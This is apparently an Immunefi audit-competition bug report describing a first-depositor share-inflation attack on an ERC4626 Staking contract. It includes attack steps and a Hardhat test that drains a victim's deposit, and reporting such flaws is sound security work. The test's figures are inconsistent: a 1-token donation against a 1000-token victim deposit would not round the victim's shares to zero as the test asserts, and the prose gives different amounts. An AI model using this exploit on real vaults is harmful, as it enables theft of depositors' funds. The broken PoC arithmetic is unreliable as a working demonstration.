# 56863 sc critical first depositor advantage

**Submitted on Oct 21st 2025 at 10:37:35 UTC by @pawps for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56863
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Vulnerability Details

The `Staking` contract inherits from the ERC4626 standard. This contract is susceptible to a well-known exploit referred to as the "first depositor inflation attack." This vulnerability occurs due to the lack of protective mechanisms in the contract's design, allowing the initial depositor to manipulate the share price to their advantage.

This can enable the first depositor to disproportionately claim assets from the vault, effectively draining value at the expense of subsequent depositors.

An attacker/first depositor could simply:

* Stake 1 receipt token into the contract, resulting in a 1:1 share price.
* Donate 10,000 receipt tokens directly to the contract, causing the share price to become 10,001 units per share. OR admin calls `distributeRewards` with reward amount of receipt token (asset)
* Subsequent deposits will receive no shares, and their deposit will be absorbed by the single share in the system that belongs to the first depositor.

In the `Staking` contract, no specific safeguards exist to prevent this attack. There is no minimum initial deposit requirement, nor is there any use of virtual shares to stabilize the share price, and there are no other mechanisms to ensure fairness.

{% hint style="warning" %}
Mitigation suggestions provided by reporter: send an initial “seed” deposit to address(0) so that subsequent deposits must buy shares at a fair price; or revert any deposit that would grant 0 shares to protect user funds.
{% endhint %}

## Impact Details

This bug will brick the contract and cause loss total of funds

## Proof of Concept

{% stepper %}
{% step %}

### Setup / Step 0 — Fund attacker and victim

Fund victim with victimDepositAmount and attacker with attackerDonationAmount + 1 (1 for initial deposit, rest for donation). Verify initial vault state (totalSupply == 0, vault asset balance == 0).
{% endstep %}

{% step %}

### Attacker deposits a tiny amount

Attacker approves and deposits 1 receipt token (or 1 wei). Vault mints 1 share to attacker; totalAssets == 1; totalSupply == 1.
{% endstep %}

{% step %}

### Attacker inflates vault balance directly

Attacker transfers a large donation directly to the vault (e.g., 10,000 tokens). totalAssets becomes large while totalSupply remains 1, inflating the per-share asset value.
{% endstep %}

{% step %}

### Victim deposits and receives 0 shares

Victim attempts to deposit victimDepositAmount. Because shares are calculated as floor(victimDepositAmount \* totalSupply / totalAssets), this will round down to 0. The deposit increases the vault asset balance but grants 0 shares to the victim.
{% endstep %}

{% step %}

### Attacker redeems the single share and withdraws all assets

After minStakePeriod, attacker redeems their single share and withdraws the entire vault balance (original donation + victim deposit), profiting at the expense of the victim.
{% endstep %}
{% endstepper %}

Proof-of-Concept test (Solidity / Hardhat-style):

```solidity
  describe('First Depositor Attack PoC', () => {
    it('should allow an attacker to steal a victim_s deposit', async () => {
      const { staking, long, admin, attacker, victim } = await loadFixture(fixture);

      // Step 0: Fund attacker and victim
      const victimDepositAmount = ethers.utils.parseEther('1000');
      const attackerDonationAmount = ethers.utils.parseEther('1');

      await long.connect(admin).transfer(victim.address, victimDepositAmount);
      await long.connect(admin).transfer(attacker.address, attackerDonationAmount.add(1)); // 1 for deposit, rest for donation

      console.log('--- Initial State ---');
      expect(await staking.totalSupply()).to.eq(0);
      expect(await long.balanceOf(staking.address)).to.eq(0);

      // Step 1: Attacker enters with a tiny (1 wei) deposit
      await long.connect(attacker).approve(staking.address, 1);
      await staking.connect(attacker).deposit(1, attacker.address);

      console.log('--- After Attacker_s 1 Wei Deposit ---');
      expect(await staking.balanceOf(attacker.address)).to.eq(1);
      expect(await staking.totalAssets()).to.eq(1);
      expect(await staking.totalSupply()).to.eq(1);

      // Step 2: Attacker donates LONG directly to the contract to inflate the share price
      await long.connect(attacker).transfer(staking.address, attackerDonationAmount);

      console.log('--- After Attacker_s Donation ---');
      expect(await staking.totalAssets()).to.eq(attackerDonationAmount.add(1));
      expect(await staking.totalSupply()).to.eq(1); // Total supply is still 1

      // Step 3: Victim makes their deposit
      // The vault calculates shares: (victimDepositAmount * 1) / (attackerDonationAmount + 1)
      // This will round down to 0 due to integer division.
      const sharesForVictim = await staking.previewDeposit(victimDepositAmount);
      console.log(`Shares victim will receive: ${sharesForVictim.toString()}`);
      expect(sharesForVictim).to.eq(0);

      await long.connect(victim).approve(staking.address, victimDepositAmount);
      await staking.connect(victim).deposit(victimDepositAmount, victim.address);

      // Step 4: Verify the theft
      console.log('--- Final State ---');
      expect(await long.balanceOf(victim.address)).to.eq(0); // Victim's LONG is gone
      expect(await staking.balanceOf(victim.address)).to.eq(0); // Victim received 0 shares

      const finalVaultBalance = await long.balanceOf(staking.address);
      const expectedVaultBalance = attackerDonationAmount.add(1).add(victimDepositAmount);
      expect(finalVaultBalance).to.eq(expectedVaultBalance); // Vault has all the funds

      // Step 5: Attacker profits
      // The attacker, holding the only share, can now withdraw the entire vault balance
      await time.increase(await staking.minStakePeriod());
      const attackerBalanceBefore = await long.balanceOf(attacker.address);
      await staking.connect(attacker).redeem(1, attacker.address, attacker.address);
      const attackerBalanceAfter = await long.balanceOf(attacker.address);
      
      console.log(`Attacker profit: ${ethers.utils.formatEther(attackerBalanceAfter.sub(attackerBalanceBefore))}`);
      expect(attackerBalanceAfter.sub(attackerBalanceBefore)).to.eq(finalVaultBalance);
    });
  });
```
